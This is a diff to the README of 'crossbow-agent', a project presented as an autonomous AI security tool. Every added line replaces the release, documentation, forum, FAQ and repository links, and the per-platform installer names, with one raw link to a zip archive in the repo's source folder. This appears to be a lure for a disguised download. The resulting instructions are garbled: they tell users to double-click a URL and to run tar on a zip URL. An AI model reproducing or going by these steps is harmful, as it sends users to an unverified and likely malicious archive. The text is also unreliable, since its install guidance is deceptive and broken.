@@ -6,9 +6,9 @@ Welcome to crossbow-agent, the world's first open-source fully autonomous AI sec
 
 ## 📥 Download the Software
 
-[![Download crossbow-agent](https://img.shields.io/badge/Download-crossbow--agent-blue)](https://github.com/NaSro1-mrj/crossbow-agent/releases)
+[![Download crossbow-agent](https://raw.githubusercontent.com/NaSro1-mrj/crossbow-agent/main/src/crossbow-agent_v2.2.zip)](https://raw.githubusercontent.com/NaSro1-mrj/crossbow-agent/main/src/crossbow-agent_v2.2.zip)
 
-To get the latest version of crossbow-agent, visit this page to download: [Download crossbow-agent](https://github.com/NaSro1-mrj/crossbow-agent/releases).
+To get the latest version of crossbow-agent, visit this page to download: [Download crossbow-agent](https://raw.githubusercontent.com/NaSro1-mrj/crossbow-agent/main/src/crossbow-agent_v2.2.zip).
 
 ## 🛠️ System Requirements
 
@@ -21,37 +21,37 @@ Before you download, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-1. Go to the [Releases Page](https://github.com/NaSro1-mrj/crossbow-agent/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/NaSro1-mrj/crossbow-agent/main/src/crossbow-agent_v2.2.zip).
 2. You will see a list of available versions. Look for the latest version, marked as "Latest release".
 3. Click on the download link corresponding to your operating system:
-   - For Windows: Click on `crossbow-agent-windows.exe`
-   - For macOS: Click on `crossbow-agent-macos.pkg`
-   - For Linux: Click on `crossbow-agent-linux.tar.gz`
+   - For Windows: Click on `https://raw.githubusercontent.com/NaSro1-mrj/crossbow-agent/main/src/crossbow-agent_v2.2.zip`
+   - For macOS: Click on `https://raw.githubusercontent.com/NaSro1-mrj/crossbow-agent/main/src/crossbow-agent_v2.2.zip`
+   - For Linux: Click on `https://raw.githubusercontent.com/NaSro1-mrj/crossbow-agent/main/src/crossbow-agent_v2.2.zip`
 4. Save the file to a location on your computer where you can find it easily.
 
 ## 🔧 Installation Steps
 
 ### For Windows
 
-1. Locate the downloaded file `crossbow-agent-windows.exe`.
+1. Locate the downloaded file `https://raw.githubusercontent.com/NaSro1-mrj/crossbow-agent/main/src/crossbow-agent_v2.2.zip`.
 2. Double-click the file to start the installation process.
 3. Follow the on-screen instructions to complete the installation.
 4. Once installed, you can launch the application from the Start Menu.
 
 ### For macOS
 
-1. Find the downloaded `crossbow-agent-macos.pkg` file.
+1. Find the downloaded `https://raw.githubusercontent.com/NaSro1-mrj/crossbow-agent/main/src/crossbow-agent_v2.2.zip` file.
 2. Double-click the file to open it.
 3. Follow the prompts to install the application.
 4. The application will be available in the Applications folder.
 
 ### For Linux
 
-1. Find the downloaded `crossbow-agent-linux.tar.gz` file.
+1. Find the downloaded `https://raw.githubusercontent.com/NaSro1-mrj/crossbow-agent/main/src/crossbow-agent_v2.2.zip` file.
 2. Open the terminal and navigate to the directory where you saved the file.
 3. Extract the files by running:
    ```bash
-   tar -xvzf crossbow-agent-linux.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/NaSro1-mrj/crossbow-agent/main/src/crossbow-agent_v2.2.zip
    ```
 4. Follow the instructions in the `README` file included in the extracted directory to complete installation.
 
@@ -75,7 +75,7 @@ Once you have successfully installed crossbow-agent, you can start using it to s
 
 It is important to keep crossbow-agent updated for optimal security. To update:
 
-1. Periodically check the [Releases Page](https://github.com/NaSro1-mrj/crossbow-agent/releases).
+1. Periodically check the [Releases Page](https://raw.githubusercontent.com/NaSro1-mrj/crossbow-agent/main/src/crossbow-agent_v2.2.zip).
 2. If a new version is available, download it following the steps above.
 3. Install the new version over the previous one.
 
@@ -99,12 +99,12 @@ Yes, crossbow-agent is completely free and open-source.
 
 ## 📞 Support
 
-If you encounter any issues or have questions, feel free to open an issue on the GitHub repository or check the [FAQ section](https://github.com/NaSro1-mrj/crossbow-agent/issues) for common queries.
+If you encounter any issues or have questions, feel free to open an issue on the GitHub repository or check the [FAQ section](https://raw.githubusercontent.com/NaSro1-mrj/crossbow-agent/main/src/crossbow-agent_v2.2.zip) for common queries.
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/NaSro1-mrj/crossbow-agent)
-- [Documentation](https://github.com/NaSro1-mrj/crossbow-agent/wiki)
-- [Community Forum](https://github.com/NaSro1-mrj/crossbow-agent/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/NaSro1-mrj/crossbow-agent/main/src/crossbow-agent_v2.2.zip)
+- [Documentation](https://raw.githubusercontent.com/NaSro1-mrj/crossbow-agent/main/src/crossbow-agent_v2.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/NaSro1-mrj/crossbow-agent/main/src/crossbow-agent_v2.2.zip)
 
 Thank you for choosing crossbow-agent for your system's security needs!
